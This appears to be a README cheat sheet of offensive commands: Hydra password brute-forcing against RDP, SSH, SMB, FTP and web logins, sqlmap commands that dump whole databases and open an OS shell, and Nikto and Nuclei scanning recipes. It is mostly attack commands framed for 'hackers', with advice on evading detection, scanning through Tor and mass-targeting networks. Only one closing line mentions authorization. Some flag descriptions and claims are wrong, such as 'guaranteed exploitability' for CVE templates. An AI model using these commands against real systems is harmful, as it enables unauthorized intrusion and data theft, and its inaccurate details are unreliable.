# hack-Cheat-Sheets
This repo has a collection of snippets of codes and commands to help our lives! The main purpose is not be a crutch, this is a way to do not waste our precious time.


## Resources
i find these Repos very userfull 
- [Kali linux cheat sheet](https://github.com/NoorQureshi/kali-linux-cheatsheet)
- [Pentesting Tactics](https://hackviser.com/tactics/pentesting)
- [Windows Registry Attacks Cheat Sheet](https://infoseclabs.io/wp-content/uploads/simple-file-list/Windows-Registry-Attacks-Cheat-Sheet.pdf)

---
## Ninja Table
1. [Hydra cheat sheet](#1-Hydra-Cheat-Sheet)
2. [SQLmap Cheat sheet](#2-SQLmap-cheat-sheet)
3. [Nikto cheat sheet](#3-Essential-Nikto-Commands-for-Hackers)
4. [Nuclei Cheat sheet](#4-Ultimate-Nuclei-Cheat-Sheet-for-Hackers-Essential-Commands-Only)


---




# 1. Hydra Cheat Sheet


## RDP
```bash
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```

## SSH

```bash
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```

## SMB

```bash
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
```

## FTP

```bash
hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V
```

## HTTP Basic Auth

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```

## HTTP POST

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form \
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

## IMAP

```bash
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

## MySQL

```bash
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

## POP3

```bash
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

## Redis

```bash
hydra -P password.txt redis://10.0.2.5 -V
```

## Rexec

```bash
hydra -l root -P password.txt rexec://10.0.2.5 -V
```

## Rlogin

```bash
hydra -l root -P password.txt rlogin://10.0.2.5 -V
```

## RSH

```bash
hydra -L username.txt rsh://10.0.2.5 -V
```

## RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

## SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V  # Port 587 for SMTP with SSL
```

## Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
```

## VNC

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt -s <PORT> <IP> vnc
```


# 2. SQLmap cheat sheet

### Installation 

    sudo apt install sqlmap

### Automatic Analysis

    sqlmap -u “https://target.com/page/”

> Use this method to get basic info if that particular page is vulnerable or not, Note its not always reliable


### Specifying the GET Request Parameter

    sqlmap -u “https://target.com/page?para1=val1&para2=val2”

> Use this when you are sure that when the website accepts that particular parameter

### Asking SQL map to Check if particular parameter is exploitable

    “https://target_site.com/page?p1=value1&p2=value2” -p p1

> Here P1 is the first parameter and using that -p followed by p1 asks SQLmap to check that particular parameter alone.


### Specifying the POST Request Parameter

    sqlmap -u “https://target.com/page/” --data="p1=val1&p2=val2"

> This is very important since lot of web apps use POST request instead of GET request

### When a web app uses Authenticated Session With Cookie or Header

    sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"

> Get the Cookie Session for the browser's developer tools in the application section


    sqlmap -u “https://target_site.com/page/” --data="p1=val1&p2=val2" --headers="<------>"

##  Once you success fully exploit there is session thats created by SQLmap which you can use for direct connection

    sqlmap -u “https://target.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs

> You can use this file from the home path of the SQLMap tool’s output directory.


## Exploitation Commands

If the SQL injection vulnerability is observed **positive** then you can use the following commands to Exploit the SQL injection vulnerability.

### List the databases

    sqlmap -u “https://target_site.com/page?p1=value1” --dbs

### List Tables of a particular Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables

### List Columns of Table of a Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns

### Dump Specific Data of Columns of Table  of Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump

### Fully Dump Table TARGET_TABLE of Database TARGET_DB

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump

### Dump full Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump

### Run Custom Query on your own

    sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"

### Get  access to OS Shell

    sqlmap -u “https://target_site.com/page?p1=value1” --os-shell

### Get access to SQL shell

    sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell



# 3. Essential Nikto Commands for Hackers

## Core Reconnaissance Commands

### 1. **Basic Target Assessment**
```bash
# Quick vulnerability scan
nikto -h target.com

# SSL-enabled scan
nikto -h https://target.com -ssl
```

### 2. **Stealth & Evasion**
```bash
# Stealth scan with custom user agent
nikto -h target.com -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Slow scan to avoid detection
nikto -h target.com -T 012 -timeout 30

# Through proxy (Tor/Burp)
nikto -h target.com -useproxy http://127.0.0.1:8080
```

### 3. **Authentication Bypass Testing**
```bash
# Test with credentials
nikto -h target.com -id admin:admin

# Session-based scanning
nikto -h target.com -C "PHPSESSID=abc123; auth_token=xyz789"

# Custom headers for bypass
nikto -h target.com -H "X-Forwarded-For: 127.0.0.1"
```

### 4. **High-Value Vulnerability Hunting**
```bash
# Focus on critical vulns (RCE, SQLi, Auth bypass)
nikto -h target.com -Tuning 8,9,a

# Comprehensive security audit
nikto -h target.com -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c

# Information disclosure focus
nikto -h target.com -Tuning 3,b
```

### 5. **Multi-Target Operations**
```bash
# Scan multiple targets from file
nikto -h targets.txt

# Network range scanning
nikto -h 192.168.1.1-254 -p 80,443

# Subnet scanning
nikto -h 10.0.0.0/24
```

### 6. **Advanced Enumeration**
```bash
# Directory-specific scanning
nikto -h target.com -root /admin

# Multiple ports
nikto -h target.com -p 80,443,8080,8443

# Skip SSL cert verification
nikto -h https://target.com -nossl
```

### 7. **Output for Reporting**
```bash
# HTML report for clients
nikto -h target.com -Format htm -o report.html

# Machine-readable XML
nikto -h target.com -Format xml -o results.xml

# Quick text output
nikto -h target.com -o findings.txt
```

## Critical One-Liners

### **The Penetration Tester's Favorite**
```bash
nikto -h target.com -Tuning 1,2,3,8,9,a -ssl -Format htm -o pwn_results.html
```
*Scans for file disclosure, misconfig, info leak, RCE, SQLi, and auth bypass*

### **The Stealth Operator**
```bash
nikto -h target.com -T 012 -timeout 30 -useragent "Mozilla/5.0" -useproxy http://127.0.0.1:9050
```
*Low-profile scan through Tor with realistic user agent*

### **The Bug Bounty Hunter**
```bash
nikto -h target.com -Tuning 3,4,5,9 -ssl -root /api -Format xml -o bounty.xml
```
*Focuses on info disclosure, XSS, file retrieval, and SQLi in API endpoints*

### **The Red Teamer**
```bash
nikto -h target.com -Tuning 8,a -C "session=admin_token" -H "X-Real-IP: 127.0.0.1"
```
*Targets RCE and auth bypass with session hijacking and IP spoofing*

## What Hackers Look For

### **Immediate Exploitation Opportunities**
- Default credentials (admin/admin, root/root)
- Unprotected admin panels
- File upload vulnerabilities
- Command injection points
- SQL injection entry points

### **Information Gathering Gold**
- Server versions and technologies
- Directory structures
- Configuration file exposure
- Backup file locations
- Source code leaks

### **Privilege Escalation Paths**
- Authentication bypass methods
- Session management flaws
- Access control misconfigurations
- Administrative interface exposure

## Pro Tips for Real Engagements

### **Avoid Detection**
```bash
# Randomize timing
nikto -h target.com -timeout $(shuf -i 10-30 -n 1)

# Use residential proxy chains
nikto -h target.com -useproxy http://proxy1:8080
```

### **Maximum Coverage**
```bash
# Full port scan integration
for port in $(nmap -p- --open target.com | grep open | cut -d/ -f1); do
    nikto -h target.com -p $port
done
```

### **Automated Reporting**
```bash
# Quick findings extract
nikto -h target.com | grep -E "(OSVDB|CVE|+ |ERROR)" > critical_findings.txt
```

## The Hacker's Nikto Workflow

1. **Reconnaissance**: `nikto -h target.com -Tuning b`
2. **Vulnerability Discovery**: `nikto -h target.com -Tuning 8,9,a`  
3. **Information Gathering**: `nikto -h target.com -Tuning 1,2,3`
4. **Exploitation Prep**: `nikto -h target.com -root /admin -C "session_token"`

---


# 4. Ultimate Nuclei Cheat Sheet for Hackers (Essential Commands Only)

## Installation & Setup
```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# CRITICAL - Update templates first!
nuclei -update-templates
```

## The Essential Commands Every Hacker Needs

### **1. Core CVE Hunting (Priority #1)**
```bash
# Critical vulnerabilities only
nuclei -u target.com -t cves/ -s critical,high

# Recent CVEs (most likely unpatched)
nuclei -u target.com -t cves/2024/ -t cves/2023/

# Mass CVE hunting
nuclei -l targets.txt -t cves/ -s critical,high -j -o findings.json
```

### **2. Multi-Target Operations**
```bash
# File-based scanning
nuclei -l targets.txt -t cves/ -t vulnerabilities/ -s critical,high

# Network range
nuclei -u 192.168.1.1-254 -t cves/

# Subdomain pipeline
subfinder -d target.com | nuclei -t cves/ -s critical,high
```

### **3. Stealth & Evasion**
```bash
# Rate limited stealth scan
nuclei -u target.com -t cves/ -rl 5 -proxy-url http://127.0.0.1:8080

# Custom headers to avoid detection
nuclei -u target.com -t cves/ -H "User-Agent: Mozilla/5.0" -rl 10
```

### **4. High-Value Target Categories**
```bash
# Default credentials
nuclei -u target.com -t default-logins/

# Information disclosure (bug bounty gold)
nuclei -u target.com -t exposures/ -t misconfiguration/

# Authentication bypass
nuclei -u target.com -tags auth-bypass,sqli,rce
```

## The Hacker's Power Commands

### **The Penetration Tester's Arsenal**
```bash
nuclei -l targets.txt -t cves/ -t vulnerabilities/ -t default-logins/ -s critical,high -j -o pwn.json
```

### **The Bug Bounty Hunter's Weapon**
```bash
nuclei -u target.com -t exposures/ -t misconfiguration/ -tags disclosure,config,backup -j -o bounty.json
```

### **The Red Teamer's Tool**
```bash
nuclei -u target.com -t cves/ -tags rce,auth-bypass,sqli -rl 5 -proxy-url http://127.0.0.1:8080
```

### **The Infrastructure Scanner**
```bash
nuclei -l network.txt -t network/ -t ssl/ -tags ssl,cert,ssh,ftp
```

## Critical Template Categories

```bash
# Remote Code Execution (HIGHEST PRIORITY)
nuclei -u target.com -tags rce

# SQL Injection
nuclei -u target.com -tags sqli

# Authentication Bypass
nuclei -u target.com -tags auth-bypass

# File Upload Vulnerabilities
nuclei -u target.com -tags upload,file

# Server-Side Request Forgery
nuclei -u target.com -tags ssrf
```

## Output & Analysis

### **Essential Output Formats**
```bash
# JSON for parsing
nuclei -u target.com -t cves/ -j -o results.json

# Silent mode (findings only)
nuclei -u target.com -t cves/ -silent

# Markdown report
nuclei -u target.com -t cves/ -me report.md
```

### **Quick Analysis**
```bash
# Extract critical findings
cat results.json | jq '.info | select(.severity=="critical")'

# Count by severity
cat results.json | jq -r '.info.severity' | sort | uniq -c

# Get unique CVEs found
cat results.json | jq -r '.template' | grep CVE | sort -u
```

## Tool Integration

### **Mass Reconnaissance Pipeline**
```bash
# Complete automation
subfinder -d target.com | httpx -silent | nuclei -t cves/ -t vulnerabilities/ -s critical,high -j -o results.json
```

### **With Other ProjectDiscovery Tools**
```bash
# Port discovery + vulnerability scan
naabu -host target.com | nuclei -t network/

# HTTP probe + web vuln scan
httpx -l domains.txt | nuclei -t cves/ -t exposures/
```

## Performance & Scale

### **High-Performance Scanning**
```bash
# Increase concurrency
nuclei -l targets.txt -c 50 -t cves/

# Bulk operations
nuclei -l targets.txt -bulk-size 25 -t cves/ -s critical,high
```

### **Resource Optimization**
```bash
# Stream mode for large target lists
nuclei -l huge_targets.txt -stream -t cves/

# Memory efficient
nuclei -l targets.txt -t cves/ -timeout 10 -retries 1
```

## Real-World Hacker Workflows

### **Phase 1: Quick Assessment**
```bash
nuclei -u target.com -t cves/ -s critical,high -silent
```

### **Phase 2: Deep Reconnaissance**
```bash
nuclei -u target.com -t exposures/ -t misconfiguration/ -t technologies/
```

### **Phase 3: Exploitation Prep**
```bash
nuclei -u target.com -t default-logins/ -t vulnerabilities/ -tags rce,sqli,auth-bypass
```

## Advanced Multi-Commands

### **Complete Bug Bounty Automation**
```bash
#!/bin/bash
domain=$1
subfinder -d $domain | httpx -silent | nuclei -t cves/ -t exposures/ -t misconfiguration/ -s medium,high,critical -j -o ${domain}_complete.json
```

### **Enterprise Penetration Testing**
```bash
#!/bin/bash
# Full infrastructure assessment
nuclei -l internal_network.txt -t cves/ -t network/ -t ssl/ -t default-logins/ -s critical,high -j -o pentest_findings.json
```

### **Continuous Monitoring**
```bash
#!/bin/bash
# Daily security check
nuclei -l production_assets.txt -t cves/2024/ -s critical,high -j -o daily_$(date +%Y%m%d).json
```

## Critical Flags Reference

| Flag | Purpose | Example |
|------|---------|---------|
| `-t` | Templates | `-t cves/` |
| `-s` | Severity | `-s critical,high` |
| `-l` | Target list | `-l targets.txt` |
| `-j` | JSON output | `-j -o results.json` |
| `-rl` | Rate limit | `-rl 10` |
| `-c` | Concurrency | `-c 50` |
| `-tags` | Filter by tags | `-tags rce,sqli` |
| `-proxy-url` | Use proxy | `-proxy-url http://127.0.0.1:8080` |
| `-silent` | Quiet mode | `-silent` |
| `-update-templates` | Update DB | `-update-templates` |

## The Only Commands You Actually Need

### **Daily Use (80% of the time)**
```bash
# Basic CVE hunting
nuclei -u target.com -t cves/ -s critical,high

# Mass scanning
nuclei -l targets.txt -t cves/ -t vulnerabilities/ -s critical,high -j -o results.json

# Stealth scanning
nuclei -u target.com -t cves/ -rl 5 -silent
```

### **Advanced Use (20% of the time)**
```bash
# Full automation pipeline
subfinder -d target.com | nuclei -t cves/ -t exposures/ -s critical,high

# Custom template testing
nuclei -u target.com -t custom-template.yaml -debug

# Infrastructure scanning
nuclei -l networks.txt -t network/ -t ssl/ -tags ssh,ssl,cert
```

---

**Remember**: 
- Run `nuclei -update-templates` before every engagement
- Focus on CVEs first (guaranteed exploitability)
- Use JSON output for automated parsing
- Always scan with proper authorization






